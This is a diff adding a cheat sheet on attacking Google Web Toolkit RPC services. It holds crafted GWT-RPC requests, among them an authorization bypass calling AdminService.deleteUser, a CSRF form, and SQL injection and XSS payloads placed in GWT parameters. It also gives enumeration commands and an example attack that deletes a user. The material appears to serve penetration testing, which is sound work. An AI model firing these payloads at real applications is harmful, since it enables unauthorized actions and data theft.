@@ -1,0 +1,179 @@
+# Google Web Toolkit (GWT) Exploitation
+
+## ========================================
+## GWT RPC ENDPOINTS
+## ========================================
+
+# Common GWT RPC paths
+/.nocache.js
+/gwt/
+/*.gwt.rpc
+/service
+
+## ========================================
+## GWT-RPC FORMAT
+## ========================================
+
+# GWT-RPC request format
+7|0|6|http://example.com/|ABC123|com.example.client.MyService|myMethod|java.lang.String/2004016611|test|1|2|3|4|1|5|6|
+
+# Components:
+# - Protocol version
+# - Flags
+# - String table size
+# - Module base URL
+# - Strong name
+# - Service name
+# - Method name
+# - Parameter types
+# - Parameters
+
+## ========================================
+## DESERIALIZATION
+## ========================================
+
+# GWT deserialization gadgets
+java.lang.String/2004016611
+java.util.ArrayList/4159755760
+java.util.Date/3385151746
+
+## ========================================
+## INFORMATION DISCLOSURE
+## ========================================
+
+# Enumerate GWT services
+GET /*.gwt.rpc
+
+# Find serialization policies
+/*.gwt.rpc files reveal:
+- Service interfaces
+- Method names
+- Parameter types
+- Return types
+
+## ========================================
+## CSRF IN GWT
+## ========================================
+
+# GWT-RPC CSRF
+<form action="/gwt/service" method="POST">
+  <input name="payload" value="7|0|4|...">
+</form>
+
+## ========================================
+## TAMPERING REQUESTS
+## ========================================
+
+# Modify GWT-RPC payload
+1. Intercept request
+2. Decode GWT-RPC format
+3. Modify parameters
+4. Re-encode
+5. Send modified request
+
+## ========================================
+## BYPASS AUTHORIZATION
+## ========================================
+
+# Call restricted methods
+7|0|6|http://example.com/|ABC123|com.example.admin.AdminService|deleteUser|java.lang.Integer/3438268394|123|1|2|3|4|1|5|6|
+
+## ========================================
+## ENUMERATION
+## ========================================
+
+# Find GWT modules
+grep -r ".gwt.xml" .
+find . -name "*.nocache.js"
+
+# Analyze GWT cache files
+cat *.nocache.js
+cat *.cache.html
+
+## ========================================
+## DEOBFUSCATION
+## ========================================
+
+# GWT code is obfuscated
+# Use GWT-RPC analyzer tools
+# Reverse engineer from .gwt.rpc files
+
+## ========================================
+## SQL INJECTION IN GWT
+## ========================================
+
+# Inject via GWT-RPC parameters
+java.lang.String/2004016611|' OR '1'='1
+
+## ========================================
+## XSS IN GWT
+## ========================================
+
+# Inject XSS via GWT parameters
+java.lang.String/2004016611|<script>alert(1)</script>
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite
+- Inspect GWT-RPC traffic
+- Modify requests
+
+# GWT-RPC Analyzer
+# Parse .gwt.rpc files
+
+# Custom scripts
+# Decode/encode GWT-RPC format
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify GWT application
+- Look for .nocache.js
+- Check for /gwt/ paths
+
+# 2. Find RPC endpoints
+- Browse to /*.gwt.rpc
+- Analyze responses
+
+# 3. Enumerate methods
+- Parse .gwt.rpc files
+- List available services
+
+# 4. Test authorization
+- Call admin methods
+- Bypass access controls
+
+# 5. Test injection
+- SQL injection in parameters
+- XSS in string parameters
+
+## ========================================
+## COMMON VULNERABILITIES
+## ========================================
+
+# Insecure deserialization
+# Missing authorization checks
+# CSRF on GWT-RPC endpoints
+# Information disclosure via .gwt.rpc
+# SQL injection
+# XSS
+
+## ========================================
+## EXAMPLE ATTACK
+## ========================================
+
+# 1. Find GWT service
+GET /app.gwt.rpc
+
+# 2. Parse service definition
+# Identifies: AdminService.deleteUser(int userId)
+
+# 3. Craft malicious request
+POST /gwt/service
+7|0|6|http://target.com/app/|ABC123|com.company.admin.AdminService|deleteUser|java.lang.Integer/3438268394|1|1|2|3|4|1|5|6|
+
+# 4. Execute unauthorized action
+# Deletes user with ID=1
